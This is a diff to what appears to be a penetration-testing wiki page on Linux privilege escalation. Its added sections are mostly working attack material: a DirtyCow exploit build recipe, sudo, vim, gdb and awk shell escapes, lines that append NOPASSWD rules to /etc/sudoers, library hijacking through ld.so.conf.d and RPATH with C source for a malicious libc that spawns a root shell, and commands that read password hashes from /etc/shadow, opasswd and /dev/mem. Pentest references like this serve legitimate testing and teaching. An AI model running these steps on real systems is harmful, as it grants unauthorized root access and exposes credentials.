@@ -14,7 +14,7 @@ uname -a
 searchsploit "Linux Kernel"
 ```
 
-You can find a good vulnerable kernel list and some already **compiled exploits** here: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)  
+You can find a good vulnerable kernel list and some already **compiled exploits** here: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).  
 Other sites where you can find some **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
 
 To extract all the vulnerable kernel versions from that web you can do:
@@ -30,6 +30,18 @@ Tools that could help searching for kernel exploits are:
 [linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) \(execute IN victim,only checks exploits for kernel 2.x\)
 
 Always **search the kernel version in Google**, maybe your kernel version is wrote in some kernel exploit and then you will be sure that this exploit is valid.
+
+### CVE-2016-5195 \(DirtyCow\)
+
+Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8
+
+```bash
+# make dirtycow stable
+echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
+```
 
 ### Sudo version
 
@@ -83,7 +95,7 @@ If you know any password of the environment try to login as each user using the 
 
 Check if you are in some group that could grant you root rights:
 
-{% page-ref page="interesting-groups-linux-pe.md" %}
+{% page-ref page="interesting-groups-linux-pe/" %}
 
 ## Writable PATH abuses
 
@@ -254,6 +266,12 @@ To dump a process memory you could use:
 * [https://github.com/hajzer/bash-memory-dump](https://github.com/hajzer/bash-memory-dump) \(root is required\)
 * Script A.5 from [https://www.delaat.net/rp/2016-2017/p97/report.pdf](https://www.delaat.net/rp/2016-2017/p97/report.pdf) \(root is required\)
 
+
+
+```text
+strings /dev/mem -n10 | grep -i PASS
+```
+
 ## Scheduled jobs
 
 Check if any scheduled job has any type of vulnerability. Maybe you can take advantage of any script that root executes sometimes \(wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?\).
@@ -338,7 +356,22 @@ ftp>!/bin/sh
 less>! <shell_comand>
 ```
 
-{% embed url="https://gtfobins.github.io/" %}
+### NOPASSWD
+
+Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.
+
+```text
+$ sudo -l
+
+User demo may run the following commands on crashlab:
+    (root) NOPASSWD: /usr/bin/vim
+```
+
+In this example the user `demo` can run `vim` as `root`, it is now trivial to get a shell by adding an ssh key into the root directory or by calling `sh`.
+
+```text
+sudo vim -c '!sh'
+```
 
 ### Sudo execution bypassing paths
 
@@ -396,7 +429,11 @@ Then, when you call the suid binary, this function will be executed
 
 To avoid this mechanism being used as an attack vector for _suid/sgid_ executable binaries, the loader ignores _LD\_PRELOAD_ if _ruid != euid_. For such binaries, only libraries in standard paths that are also _suid/sgid_ will be preloaded.
 
-If you find inside the output of _**sudo -l**_ the sentence: _**env\_keep+=LD\_PRELOAD**_ and you can call some command with sudo, you can escalate privileges.
+If you find inside the output of **`sudo -l`** the sentence: _**env\_keep+=LD\_PRELOAD**_ and you can call some command with sudo, you can escalate privileges.
+
+```text
+Defaults        env_keep += LD_PRELOAD
+```
 
 Save as **/tmp/pe.c**
 
@@ -457,6 +494,36 @@ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
 
 And execute the binary.
 
+### GTFOBins
+
+[**GTFOBins**](https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
+
+The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
+
+> gdb -nx -ex '!sh' -ex quit  
+> sudo mysql -e '! /bin/sh'  
+> strace -o /dev/null /bin/sh  
+> sudo awk 'BEGIN {system\("/bin/sh"\)}'
+
+{% embed url="https://gtfobins.github.io/" %}
+
+### /etc/sudoers, /etc/sudoers.d
+
+The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. This files **by default can only be read by user root and group root**.  
+**If** you can **read** this file you could be able to **obtain some interesting information**, and if you can **write** any file you will be able to **escalate privileges**.
+
+```bash
+ls -l /etc/sudoers /etc/sudoers.d/
+ls -ld /etc/sudoers.d/
+```
+
+If you can write you can abuse this permissions
+
+```bash
+echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
+```
+
 ### /etc/ld.so.conf.d/
 
 If you can create a file in `/etc/ld.so.conf.d/` and you can execute **`ldconfig`**with root privileges \(sudo or suid\) then you can **make executable load arbitrary libraries**. 
@@ -489,17 +556,95 @@ Note in the next image that \(_having already created the backdoor on /tmp_\) ha
 
 _This example was taken from the HTB machine: Dab._
 
+### DOAS
+
+There are some alternatives to the `sudo` binary such as `doas` for OpenBSD, remember to check its configuration at `/etc/doas.conf`
+
+```text
+permit nopass demo as root cmd vim
+```
+
+## Shared Library
+
+#### ldconfig
+
+Identify shared libraries with `ldd`
+
+```text
+$ ldd /opt/binary
+    linux-vdso.so.1 (0x00007ffe961cd000)
+    vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
+    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
+```
+
+Create a library in `/tmp` and activate the path.
+
+```text
+gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
+echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
+/opt/binary
+```
+
+#### RPATH
+
+```text
+level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
+ 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
+ 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
+
+level15@nebula:/home/flag15$ ldd ./flag15 
+ linux-gate.so.1 =>  (0x0068c000)
+ libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
+ /lib/ld-linux.so.2 (0x005bb000)
+```
+
+By copying the lib into `/var/tmp/flag15/` it will be used by the program in this place as specified in the `RPATH` variable.
+
+```text
+level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
+
+level15@nebula:/home/flag15$ ldd ./flag15 
+ linux-gate.so.1 =>  (0x005b0000)
+ libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
+ /lib/ld-linux.so.2 (0x00737000)
+```
+
+Then create an evil library in `/var/tmp` with `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
+
+```text
+#include<stdlib.h>
+#define SHELL "/bin/sh"
+
+int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
+{
+ char *file = SHELL;
+ char *argv[] = {SHELL,0};
+ setresuid(geteuid(),geteuid(), geteuid());
+ execve(file,argv,0);
+}
+```
+
 ## Capabilities
 
 [Capabilities](https://www.insecure.ws/linux/getcap_setcap.html) are a little obscure but similar in principle to SUID. Linux’s thread/process privilege checking is based on capabilities: flags to the thread that indicate what kind of additional privileges they’re allowed to use. By default, root has all of them.
 
-Examples:
-
-| Capability | Description |
+| Capabilities name | Description |
 | :--- | :--- |
-| CAP\_DAC\_OVERRIDE | Override read/write/execute permission checks \(full filesystem access\) |
-| CAP\_DAC\_READ\_SEARCH | Only override reading files and opening/listing directories \(full filesystem READ access\) |
-| CAP\_KILL | Can send any signal to any process \(such as sig kill\) |
+| CAP\_AUDIT\_CONTROL | Allow to enable/disable kernel auditing |
+| CAP\_AUDIT\_WRITE | Helps to write records to kernel auditing log |
+| CAP\_BLOCK\_SUSPEND | This feature can block system suspends |
+| **CAP\_CHOWN** | Allow user to make arbitrary change to files UIDs and GIDs \(full filesystem access\) |
+| **CAP\_DAC\_OVERRIDE** | This helps to bypass file read, write and execute permission checks \(full filesystem access\) |
+| **CAP\_DAC\_READ\_SEARCH** | This only bypass file and directory read/execute permission checks |
+| CAP\_FOWNER | This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file |
+| CAP\_KILL | Allow the sending of signals to processes belonging to others |
+| CAP\_SETGID | Allow changing of the GID |
+| **CAP\_SETUID** | Allow changing of the UID \(set UID of root in you process\) |
+| CAP\_SETPCAP | Helps to transferring and removal of current set to any PID |
+| CAP\_IPC\_LOCK | This helps to lock memory |
+| CAP\_MAC\_ADMIN | Allow MAC configuration or state changes |
+| CAP\_NET\_RAW | Use RAW and PACKET sockets |
+| CAP\_NET\_BIND\_SERVICE | SERVICE Bind a socket to internet domain privileged ports |
 | CAP\_SYS\_CHROOT | Ability to call chroot\(\) |
 
 Capabilities are useful when you want to restrict your own processes after performing privileged operations \(e.g. after setting up chroot and binding to a socket\). However, they can be exploited by passing them malicious commands or arguments which are then run as root.
@@ -642,9 +787,9 @@ If you Forward Agent configured in an environment ****[**check here how to explo
 
 Check if you can read some sensitive files and what is contained in some folders. For example:
 
-```text
-cat /etc/shadow
-```
+* `cat /etc/shadow` This is the file that contains password hashes
+* `cat /etc/security/opasswd` This file may contain password hashes history
+* `cat /etc/passwd` In some cases this file may contain hashes of passwords
 
 Check the contents of **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports**
 
